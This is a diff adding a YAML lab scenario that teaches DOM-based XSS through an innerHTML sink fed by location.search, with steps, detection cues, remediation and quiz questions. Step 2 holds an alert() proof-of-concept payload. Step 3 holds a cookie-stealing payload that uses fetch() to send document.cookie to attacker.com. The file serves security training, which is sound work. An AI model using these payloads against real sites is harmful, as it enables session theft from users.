@@ -1,0 +1,91 @@
+# Category: Cross-Site Scripting (XSS)
+name: "DOM XSS in innerHTML sink using location.search source"
+id: "xss-dom-innerhtml-001"
+category: "xss"
+subcategory: "dom_based"
+difficulty: "apprentice"
+estimated_time: "30 minutes"
+
+description: |
+  This scenario covers DOM-based XSS where the application sets the
+  `innerHTML` property of an element using data from `location.search`.
+  The attacker can inject HTML/JavaScript that executes when the page
+  processes the content.
+
+learning_objectives:
+  - Understand the innerHTML sink and its risks
+  - Identify where user input is used in innerHTML
+  - Exploit the vulnerability with a crafted payload
+
+tools:
+  - Burp Suite
+  - Browser developer tools
+
+prerequisites:
+  - Basic understanding of JavaScript and DOM
+  - Access to a vulnerable web application or lab
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Find JavaScript code that uses innerHTML with location.search"
+    commands:
+      - "# Use browser developer tools to search for 'innerHTML'"
+      - "# Trace the source of data to location.search"
+    expected_output: "Vulnerable code identified"
+    detection: "None"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Inject payload into URL parameter"
+    commands:
+      - "# Example: http://example.com/page?param=<img src=x onerror=alert('XSS')>"
+      - "# Observe if the script executes"
+    expected_output: "JavaScript alert executes"
+    detection: "Web server logs may show unusual parameters"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Steal data or perform actions"
+    commands:
+      - "# Payload: <img src=x onerror='fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)'>"
+    expected_output: "Cookie exfiltrated"
+    detection: "Attacker server logs"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1189"
+    description: "Drive-by Compromise"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "URLs with HTML tags in parameters"
+  log_indicators:
+    - "Web server logs with suspicious query strings"
+  endpoint_indicators:
+    - "None"
+
+remediation:
+  immediate:
+    - "Use textContent or innerText instead of innerHTML"
+    - "Sanitize HTML using a library like DOMPurify"
+  long_term:
+    - "Implement CSP with 'unsafe-inline' disabled"
+    - "Use secure DOM manipulation methods"
+
+variables:
+  target_url: "http://example.com/page?param=PAYLOAD"
+
+assessment_questions:
+  - "Why is innerHTML dangerous when used with user input?"
+  - "What is the difference between innerHTML and textContent?"
+  - "How can you safely insert user content into the DOM?"
+
+references:
+  - url: "https://owasp.org/www-community/attacks/DOM_Based_XSS"
+    title: "OWASP DOM XSS"
+  - url: "https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML"
+    title: "MDN innerHTML"
